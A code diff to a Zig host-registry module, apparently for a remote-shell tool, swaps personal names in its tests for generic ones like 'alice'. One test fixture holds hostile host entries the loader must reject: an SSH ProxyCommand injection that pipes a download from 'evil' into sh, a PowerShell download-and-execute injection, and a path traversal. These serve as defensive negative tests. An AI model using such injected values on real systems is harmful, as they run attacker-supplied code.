@@ -45,7 +45,7 @@ pub const Registry = struct {
     }
 };
 
-/// "windows" matches "felipe-windows": a dash-separated part of the name.
+/// "linux2" matches "home-linux2": a dash-separated part of the name.
 fn containsWord(name: []const u8, token: []const u8) bool {
     if (token.len < 3) return false;
     var it = std.mem.splitScalar(u8, name, '-');
@@ -191,11 +191,11 @@ test "an entry that is not a machine is dropped, whatever wrote the file" {
     const ctx = sys.Ctx{ .io = std.testing.io, .gpa = gpa, .env = &env };
     try sys.writeFileAtomic(ctx,
         path,
-        \\host good frb@good posix
+        \\host good alice@good posix
         \\host evil -oProxyCommand=curl\u{20}evil|sh posix
         \\host pwsh a';iex(iwr\u{20}x);#@win msys
-        \\host ../../etc frb@x posix
-        \\host scp frb@host:/tmp posix
+        \\host ../../etc alice@x posix
+        \\host scp alice@host:/tmp posix
         \\
     );
     const reg = try load(ctx);
@@ -206,17 +206,17 @@ test "an entry that is not a machine is dropped, whatever wrote the file" {
 
 test "resolve by name, prefix and dash word" {
     var hosts = [_]Host{
-        .{ .name = "macbook-pro", .target = "frb@macbook-pro", .kind = .posix },
-        .{ .name = "felipe-windows", .target = "Micromed@felipe-windows", .kind = .msys },
-        .{ .name = "frb-linux", .target = "frb@frb-linux", .kind = .posix },
-        .{ .name = "frb-linux2", .target = "frb@frb-linux2", .kind = .posix },
+        .{ .name = "macbook", .target = "alice@macbook", .kind = .posix },
+        .{ .name = "windows-pc", .target = "alice@windows-pc", .kind = .msys },
+        .{ .name = "home-linux", .target = "alice@home-linux", .kind = .posix },
+        .{ .name = "home-linux2", .target = "alice@home-linux2", .kind = .posix },
     };
-    const reg = Registry{ .path = "", .hosts = &hosts, .self_line = null, .self = "macbook-pro" };
-    try std.testing.expectEqual(@as(?usize, 1), reg.resolve("felipe-windows"));
+    const reg = Registry{ .path = "", .hosts = &hosts, .self_line = null, .self = "macbook" };
+    try std.testing.expectEqual(@as(?usize, 1), reg.resolve("windows-pc"));
     try std.testing.expectEqual(@as(?usize, 1), reg.resolve("windows"));
-    try std.testing.expectEqual(@as(?usize, 1), reg.resolve("felipe"));
+    try std.testing.expectEqual(@as(?usize, 3), reg.resolve("linux2")); // a dash part, not a prefix
     try std.testing.expectEqual(@as(?usize, 0), reg.resolve("mac"));
-    try std.testing.expectEqual(@as(?usize, 2), reg.resolve("frb-linux")); // exact beats prefix
+    try std.testing.expectEqual(@as(?usize, 2), reg.resolve("home-linux")); // exact beats prefix
     try std.testing.expectEqual(@as(?usize, null), reg.resolve("linux")); // ambiguous
     try std.testing.expectEqual(@as(?usize, null), reg.resolve("mars"));
     try std.testing.expect(reg.isSelf(hosts[0]));
